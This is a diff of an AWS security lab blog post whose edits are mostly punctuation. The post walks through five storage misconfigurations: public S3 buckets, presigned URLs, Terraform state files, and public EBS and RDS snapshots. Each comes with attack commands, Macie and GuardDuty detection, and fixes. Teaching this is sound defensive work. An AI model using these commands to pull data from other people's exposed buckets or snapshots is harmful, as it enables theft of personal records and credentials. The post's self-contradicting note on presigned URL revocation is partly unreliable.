@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Lab — S3 Misconfiguration Deep Dive: Public Buckets, Presigned URLs, Terraform State, and Snapshot Exposure"
+title: "Lab: S3 Misconfiguration Deep Dive: Public Buckets, Presigned URLs, Terraform State, and Snapshot Exposure"
 date: 2026-06-30T10:00:00
 categories:
   - AWS Security Labs
@@ -17,7 +17,7 @@ tags:
   - cloud-attack
   - lab
 author: muhammed
-description: A hands-on lab covering five S3 and storage misconfiguration attack paths — public buckets, presigned URL abuse, Terraform state file pillaging, public EBS snapshots, and RDS snapshot sharing — with detection via Macie and GuardDuty and fixes for each.
+description: A hands-on lab covering five S3 and storage misconfiguration attack paths - public buckets, presigned URL abuse, Terraform state file pillaging, public EBS snapshots, and RDS snapshot sharing - with detection via Macie and GuardDuty and fixes for each.
 toc: true
 pin: false
 math: false
@@ -40,7 +40,7 @@ Apply the correct fix for each attack surface.
 The previous labs required exploiting running software.
 Storage misconfigurations require only a browser, the AWS CLI, or a Google search.
 
-Public S3 buckets have leaked millions of records — healthcare data, financial records, source code, and credentials — because a single setting was left at its default or accidentally changed.
+Public S3 buckets have leaked millions of records - healthcare data, financial records, source code, and credentials - because a single setting was left at its default or accidentally changed.
 Terraform state files are the most underestimated attack vector: they contain every secret, database password, and API key you ever provisioned, stored in plaintext JSON in S3.
 
 These are not sophisticated attacks.
@@ -62,15 +62,15 @@ Storage Layer
 
 ---
 
-## Phase 0 — Setup
+## Phase 0: Setup
 
-### Step 0.1 — Enable GuardDuty and Macie
+### Step 0.1: Enable GuardDuty and Macie
 
 ```bash
 # GuardDuty
 aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES
 
-# Macie — scans S3 for sensitive data patterns
+# Macie: scans S3 for sensitive data patterns
 aws macie2 enable-macie
 
 # Enable Macie S3 discovery on all buckets
@@ -84,15 +84,15 @@ aws macie2 put-classification-export-configuration \
   }'
 ```
 
-### Step 0.2 — Create the Target Buckets and Data
+### Step 0.2: Create the Target Buckets and Data
 
 ```bash
 ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
 
-# Bucket 1 — accidentally public
+# Bucket 1: accidentally public
 aws s3 mb s3://public-data-lab-$ACCOUNT_ID --region eu-west-1
 
-# Bucket 2 — Terraform state (private, but contains secrets)
+# Bucket 2: Terraform state (private, but contains secrets)
 aws s3 mb s3://terraform-state-lab-$ACCOUNT_ID --region eu-west-1
 
 # Upload fake sensitive data to the public bucket
@@ -153,7 +153,7 @@ aws s3 cp terraform.tfstate s3://terraform-state-lab-$ACCOUNT_ID/prod/terraform.
 
 ---
 
-## Attack 1 — Public S3 Bucket
+## Attack 1: Public S3 Bucket
 
 ### Make the Bucket Public
 
@@ -181,10 +181,10 @@ aws s3api put-bucket-policy \
   }"
 ```
 
-### Exploit — No Credentials Needed
+### Exploit: No Credentials Needed
 
 ```bash
-# Anonymous download — works from any machine, no AWS credentials
+# Anonymous download: works from any machine, no AWS credentials
 curl -s "https://public-data-lab-$ACCOUNT_ID.s3.eu-west-1.amazonaws.com/hr/employees.csv"
 # Returns: full employee CSV with SSNs and salaries
 
@@ -199,7 +199,7 @@ Real attackers find these via:
 - Google dork: `site:s3.amazonaws.com filetype:csv`
 - Tools: `trufflesecurity/trufflehog`, `sa7mon/S3Scanner`, `aboul3la/Bucket-Finder`
 
-> 📸 **SCREENSHOT:** Browser directly accessing the S3 URL and showing the employee CSV — no login required
+> 📸 **SCREENSHOT:** Browser directly accessing the S3 URL and showing the employee CSV - no login required
 
 **GuardDuty finding:**
 ```
@@ -216,7 +216,7 @@ SensitiveData:S3Object/Credentials (API keys detected)
 **Fix:**
 
 ```bash
-# Enforce block public access at the account level — affects ALL buckets
+# Enforce block public access at the account level: affects ALL buckets
 aws s3control put-public-access-block \
   --account-id $ACCOUNT_ID \
   --public-access-block-configuration \
@@ -236,16 +236,16 @@ aws configservice put-config-rule \
   }'
 ```
 
-> 📸 **SCREENSHOT:** After fix — the same curl returns `Access Denied` instead of the file contents
+> 📸 **SCREENSHOT:** After fix - the same curl returns `Access Denied` instead of the file contents
 
 ---
 
-## Attack 2 — Presigned URL Abuse
+## Attack 2: Presigned URL Abuse
 
 ### How Presigned URLs Work
 
 A presigned URL embeds AWS credentials and an expiry timestamp in the URL itself.
-Anyone with the URL can access the object until it expires — regardless of whether the original user's credentials have been revoked.
+Anyone with the URL can access the object until it expires - regardless of whether the original user's credentials have been revoked.
 
 ```bash
 # Generate a presigned URL for the employees file (1 hour expiry)
@@ -269,25 +269,25 @@ https://terraform-state-lab-ACCOUNT_ID.s3.eu-west-1.amazonaws.com/prod/terraform
 
 **Scenario:** A developer generates a presigned URL to share a file in a Slack message.
 The Slack channel is later compromised, or the message is indexed by a third-party app.
-The URL is still valid for an hour — long enough for exfiltration.
+The URL is still valid for an hour - long enough for exfiltration.
 
 ```bash
-# Anyone with this URL can download the file — no credentials required
+# Anyone with this URL can download the file: no credentials required
 curl -s "https://terraform-state-lab-$ACCOUNT_ID.s3.eu-west-1.amazonaws.com/prod/terraform.tfstate?X-Amz-Algorithm=..."
 # Returns: full Terraform state with database passwords
 ```
 
 **The worse scenario:** The credentials used to generate the presigned URL are from an IAM user.
-If the user is deleted or the key is revoked, **the presigned URL still works until it expires** — S3 validates the signature at generation time, not at access time.
+If the user is deleted or the key is revoked, **the presigned URL still works until it expires** - S3 validates the signature at generation time, not at access time.
 
-Wait — actually this is partially true. If an IAM user's access key is deactivated or deleted, presigned URLs generated with that key stop working. But if the URL was generated with a role's temporary credentials, revoking the session does not immediately invalidate presigned URLs either.
+Wait - actually this is partially true. If an IAM user's access key is deactivated or deleted, presigned URLs generated with that key stop working. But if the URL was generated with a role's temporary credentials, revoking the session does not immediately invalidate presigned URLs either.
 
 ```bash
 # Generate a presigned URL with a 7-day expiry (the maximum)
 aws s3 presign s3://terraform-state-lab-$ACCOUNT_ID/prod/terraform.tfstate \
   --expires-in 604800
 
-# Share the URL publicly — it remains valid for 7 days
+# Share the URL publicly: it remains valid for 7 days
 # Revoking the IAM role during those 7 days does NOT immediately cancel the URL
 ```
 
@@ -315,11 +315,11 @@ aws s3api put-bucket-policy \
   }"
 ```
 
-This policy denies any presigned URL older than 1 hour — even if the URL was generated with a 7-day expiry.
+This policy denies any presigned URL older than 1 hour - even if the URL was generated with a 7-day expiry.
 
 ---
 
-## Attack 3 — Terraform State File Pillaging
+## Attack 3: Terraform State File Pillaging
 
 ### Why State Files Are the Most Dangerous S3 Objects
 
@@ -361,7 +361,7 @@ docker run --rm \
 
 > 📸 **SCREENSHOT:** trufflehog output showing secrets found in terraform.tfstate with their types (AWS key, Stripe key, etc.)
 
-**Fix — four layers:**
+**Fix - four layers:**
 
 ```bash
 # 1. Block public access (already covered in Attack 1 fix)
@@ -412,13 +412,13 @@ aws s3api put-bucket-policy \
   }"
 ```
 
-Also consider **Terraform Cloud** or **OpenTofu** with remote state — these encrypt state and never expose it as raw S3 objects.
+Also consider **Terraform Cloud** or **OpenTofu** with remote state - these encrypt state and never expose it as raw S3 objects.
 
 ---
 
-## Attack 4 — Public EBS Snapshot
+## Attack 4: Public EBS Snapshot
 
-EBS snapshots can be shared publicly — a setting that is sometimes enabled accidentally during troubleshooting.
+EBS snapshots can be shared publicly - a setting that is sometimes enabled accidentally during troubleshooting.
 
 ### Create and Expose a Snapshot
 
@@ -442,7 +442,7 @@ SNAPSHOT_ID=$(aws ec2 create-snapshot \
 # Wait for snapshot to complete
 aws ec2 wait snapshot-completed --snapshot-ids $SNAPSHOT_ID
 
-# Make it public — the misconfiguration
+# Make it public: the misconfiguration
 aws ec2 modify-snapshot-attribute \
   --snapshot-id $SNAPSHOT_ID \
   --attribute createVolumePermission \
@@ -450,7 +450,7 @@ aws ec2 modify-snapshot-attribute \
   --group-names all
 ```
 
-### The Attack — From Any AWS Account
+### The Attack: From Any AWS Account
 
 The attacker, in their own separate AWS account, can find and mount this snapshot:
 
@@ -460,7 +460,7 @@ aws ec2 describe-snapshots \
   --owner-ids VICTIM_ACCOUNT_ID \
   --filters "Name=status,Values=completed"
 
-# Create a volume from the victim's public snapshot — in attacker's account
+# Create a volume from the victim's public snapshot: in attacker's account
 aws ec2 create-volume \
   --snapshot-id $SNAPSHOT_ID \
   --availability-zone us-east-1a \
@@ -470,7 +470,7 @@ aws ec2 create-volume \
 # The entire disk image is now in the attacker's account
 ```
 
-Tools like `aws_public_snapshots` automate this — scanning all public snapshots in a region for known victim accounts.
+Tools like `aws_public_snapshots` automate this - scanning all public snapshots in a region for known victim accounts.
 
 > 📸 **SCREENSHOT:** `aws ec2 describe-snapshots --owner-ids VICTIM_ACCOUNT_ID` returning the public snapshot from the attacker's account
 
@@ -484,7 +484,7 @@ aws ec2 modify-snapshot-attribute \
   --operation-type remove \
   --group-names all
 
-# Enforce via Config rule — finds all public snapshots
+# Enforce via Config rule: finds all public snapshots
 aws configservice put-config-rule \
   --config-rule '{
     "ConfigRuleName": "ebs-snapshot-public-restorable-check",
@@ -494,7 +494,7 @@ aws configservice put-config-rule \
     }
   }'
 
-# Enforce via SCP — prevent making snapshots public org-wide
+# Enforce via SCP: prevent making snapshots public org-wide
 # Add to your organization SCP:
 # {
 #   "Effect": "Deny",
@@ -509,14 +509,14 @@ aws configservice put-config-rule \
 ```
 
 Also: always encrypt EBS volumes with KMS CMKs.
-A public snapshot of an encrypted volume is useless without the KMS key — the attacker gets encrypted data they cannot read.
+A public snapshot of an encrypted volume is useless without the KMS key - the attacker gets encrypted data they cannot read.
 
 ---
 
-## Attack 5 — Public RDS Snapshot
+## Attack 5: Public RDS Snapshot
 
 RDS snapshots can be shared with other accounts or made public.
-Unlike EBS — where the attacker mounts a volume — with RDS they restore a full database instance in their account.
+Unlike EBS - where the attacker mounts a volume - with RDS they restore a full database instance in their account.
 
 ### Create and Share a Snapshot
 
@@ -541,17 +541,17 @@ aws rds create-db-snapshot \
 
 aws rds wait db-snapshot-available --db-snapshot-identifier lab-db-snapshot
 
-# Share with another account — or make public (the misconfiguration)
+# Share with another account: or make public (the misconfiguration)
 aws rds modify-db-snapshot-attribute \
   --db-snapshot-identifier lab-db-snapshot \
   --attribute-name restore \
   --values-to-add all   # "all" = public
 ```
 
-### The Attack — From Any AWS Account
+### The Attack: From Any AWS Account
 
 ```bash
-# Attacker in their own account — search for public RDS snapshots
+# Attacker in their own account: search for public RDS snapshots
 aws rds describe-db-snapshots \
   --snapshot-type public \
   --filters "Name=engine,Values=postgres"
@@ -561,7 +561,7 @@ aws rds restore-db-instance-from-db-snapshot \
   --db-instance-identifier attacker-restored-db \
   --db-snapshot-identifier arn:aws:rds:eu-west-1:VICTIM_ACCOUNT_ID:snapshot:lab-db-snapshot
 
-# Connect to the restored database — no password change needed
+# Connect to the restored database: no password change needed
 # The master credentials are preserved in the snapshot
 psql -h attacker-restored-db.xxxxx.rds.amazonaws.com \
   -U dbadmin \
@@ -583,7 +583,7 @@ aws rds modify-db-snapshot-attribute \
 
 # Always encrypt RDS with a KMS CMK
 # An attacker who restores an encrypted snapshot cannot read the data
-# — they would need access to your KMS CMK, which they don't have
+# - they would need access to your KMS CMK, which they don't have
 aws rds create-db-instance \
   --db-instance-identifier secure-db \
   --storage-encrypted \
@@ -604,7 +604,7 @@ aws rds create-db-instance \
 
 ---
 
-## Macie — Automated Sensitive Data Discovery
+## Macie: Automated Sensitive Data Discovery
 
 Run a Macie classification job to find sensitive data across all your S3 buckets:
 
@@ -650,21 +650,21 @@ Macie will identify:
 | Attack | GuardDuty finding | Macie finding |
 |--------|------------------|---------------|
 | Public bucket access | `Policy:S3/BucketAnonymousAccessGranted` | `SensitiveData:S3Object/Credentials` |
-| Unusual S3 enumeration | `Discovery:S3/BucketEnumeration.Unusual` | — |
-| Presigned URL from suspicious IP | `UnauthorizedAccess:S3/TorIPCaller` | — |
+| Unusual S3 enumeration | `Discovery:S3/BucketEnumeration.Unusual` | - |
+| Presigned URL from suspicious IP | `UnauthorizedAccess:S3/TorIPCaller` | - |
 | Terraform state accessed | `Exfiltration:S3/ObjectRead.Unusual` | `SensitiveData:S3Object/Credentials` |
-| Public EBS snapshot created | — (Config rule) | — |
-| Public RDS snapshot | — (Config rule) | — |
+| Public EBS snapshot created | - (Config rule) | - |
+| Public RDS snapshot | - (Config rule) | - |
 
 ---
 
 ## Key Takeaways
 
-- Public S3 buckets and the data inside them are accessible to the entire internet — block public access at the account level and treat it as a hard requirement
-- Terraform state files contain every secret from every Terraform-managed resource — they must be encrypted, access-restricted, and never shared
-- KMS encryption with a CMK is the most effective defense for snapshots and state files — an attacker who accesses the data gets ciphertext they cannot read without your key
-- Macie finds sensitive data you didn't know was there — run it on all buckets regularly, not just the ones you think contain PII
-- SCPs at the org level prevent the misconfiguration before it happens — block `ec2:ModifySnapshotAttribute` and `rds:ModifyDBSnapshotAttribute` with public group conditions
+- Public S3 buckets and the data inside them are accessible to the entire internet - block public access at the account level and treat it as a hard requirement
+- Terraform state files contain every secret from every Terraform-managed resource - they must be encrypted, access-restricted, and never shared
+- KMS encryption with a CMK is the most effective defense for snapshots and state files - an attacker who accesses the data gets ciphertext they cannot read without your key
+- Macie finds sensitive data you didn't know was there - run it on all buckets regularly, not just the ones you think contain PII
+- SCPs at the org level prevent the misconfiguration before it happens - block `ec2:ModifySnapshotAttribute` and `rds:ModifyDBSnapshotAttribute` with public group conditions
 
 ---
 
